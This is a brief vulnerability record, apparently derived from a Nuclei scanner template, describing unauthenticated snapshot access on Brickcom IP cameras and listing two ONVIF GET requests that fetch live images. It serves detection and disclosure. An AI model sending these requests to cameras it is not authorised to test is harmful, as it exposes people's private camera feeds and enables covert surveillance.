# Vulnerability: Brickcom Camera - Unauthenticated Snapshot Access
**Classification:** IOT
**Source:** Nuclei Template (`brickcom-camera-unauth-snapshot.yaml`)

## Description
Detected Brickcom IP cameras was exposed live camera snapshots without authentication via the ONVIF media endpoint.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/ONVIF/media.cgi?action=getSnapshot
GET {{BaseURL}}/ONVIF/media.cgi?action=getSnapshot&channel=1
```

